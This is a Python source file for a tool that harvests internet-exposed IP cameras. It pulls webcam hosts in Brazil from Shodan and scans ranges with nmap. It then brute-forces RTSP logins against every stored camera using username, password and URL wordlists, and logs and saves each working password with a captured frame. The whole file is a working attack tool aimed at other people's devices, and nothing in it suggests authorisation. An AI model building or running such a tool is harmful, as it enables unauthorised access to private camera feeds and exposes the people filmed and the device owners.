import base64
import itertools
import random
import logging

from abc import ABC, abstractmethod

import cv2
import shodan
from shodan import APIError

__version__ = '0.1.0'

from models.camera import Camera
from models.managers import CameraManager
from scanners.nmap_scanner import NmapScanner


class Task(ABC):
    """
    Abstract class for tasks, need implement run method
    """
    def __init__(self, config):
        if not config:
            raise ValueError('Config dict is required')
        self.config = self.parse_parameters(config)
        self.db_manager = CameraManager()

    @abstractmethod
    def run(self):
        raise NotImplementedError('You must implement the run method')

    def parse_parameters(self, parameters):
        """
        Parse parameters from config ini file
        """
        config = {}
        for p in parameters.keys():
            config[p] = parameters[p]
        return config

    def check_rtsp_connection_by_host(self, **kwargs):
        """
        Check if a camera is accessible by rtsp protocol
        :param kwargs:
        :return:
        """
        host = kwargs.get('host')
        port = kwargs.get('port')
        user = kwargs.get('user')
        password = kwargs.get('password')
        rtsp_string = kwargs.get('rtsp_string')
        rtsp_url = rtsp_string.format(user, password, host, port)
        logging.debug(f'{rtsp_url}')

        with cv2.VideoCapture(rtsp_url) as vcap:
            ret, frame = vcap.read()
            if not ret:
                logging.debug(f'No frame for {rtsp_url}')
                return None

            logging.info(f'[!] {rtsp_url}, user: {user}, password: {password}')
            image_b64 = cv2.imencode('.jpg', frame)[1].tobytes()

            return Camera(ip=host, port=port, user=user, password=password, url=rtsp_url, active=True, image_b64=image_b64)


class NmapTask(Task):
    """
    Scan for cameras on a given network using nmap, take a screenshot and add it to the database
    """
    def run(self):
        logging.info(f'Starting thread_nmap_scan')
        ip_range = self.config.get('ip_range')

        scanner = NmapScanner()
        hosts = scanner.scan(ip_range)

        for h in hosts['scan']:
            for port in hosts['scan'][h]['tcp']:
                self.db_manager.insert_into_cameras(ip=h, port=port)
                logging.info(f'Added on db {h}:{port}')
        logging.info(f'Executors: finished in thread_nmap_scan')


class ShodanTask(Task):
    """
    Search for cameras on Shodan, take a screenshot and add it to the database
    """
    def run(self):
        shodan_key = self.config.get('shodan_key')
        api = shodan.Shodan(shodan_key)
        query = 'screenshot.label:webcam,cam country:BR'
        results = api.search_cursor(query)
        logging.info('Updating database')
        cams_added = 0
        try:
            for banner in results:
                ip, port = banner.get('ip_str'), banner.get('port')
                db_response = self.db_manager.search_on_db(ip, port)
                if db_response:
                    logging.debug(f'{ip}:{port} skipped')
                else:
                    city = banner.get('location').get('city')
                    country_code = banner.get('location').get('country_code')
                    country_name = banner.get('location').get('country_name')
                    region_code = banner.get('location').get('region_code')
                    self.db_manager.insert_into_cameras(
                        ip=ip, port=port, city=city, country_code=country_code,
                        country_name=country_name, region_code=region_code
                    )
                    logging.debug(f'{ip}:{port} added')
                    cams_added += 1
            logging.info(f'{cams_added} cameras added')
            return cams_added
        except APIError as e:
            logging.error(f'Shodan api error: {e}')
            return cams_added
        except Exception as e:
            logging.error(f'Error: {e}')
            return cams_added

    def scan(self):
        pass


class CheckTask(Task):
    """
    Check cameras on database for rtsp stream and take a screenshot, adding it to the database
    """

    def run(self):
        logging.info(f'Starting thread_test_cameras')
        users_wordlist = self.config.get('wordlist_users')
        passwords_wordlist = self.config.get('wordlist_passwords')
        rtsp_urls_wordlist = self.config.get('wordlist_rtsp_urls')
        randomize = bool(self.config.get('randomize'))

        camera_users = open(users_wordlist, 'r').read().splitlines()
        camera_passwords = open(passwords_wordlist, 'r').read().splitlines()
        rtsp_url_type = open(rtsp_urls_wordlist, 'r').read().splitlines()

        if randomize:
            random.shuffle(camera_users)
            random.shuffle(camera_passwords)
            random.shuffle(rtsp_url_type)

        cameras = self.db_manager.get_random_from_db()
        logging.debug(f'Testing {len(cameras)} cameras')
        camera_combinations = itertools.product(rtsp_url_type, camera_users, camera_passwords, cameras)
        for url, user, password, camera in camera_combinations:
            ip = camera.ip
            port = camera.port
            url_login = url.format(user, password, ip, port)
            self.check_rtsp_connection_by_host(host=ip, port=port, user=user, password=password, rtsp_string=url_login)
        logging.info(f'Executors: finished in thread_test_cameras')
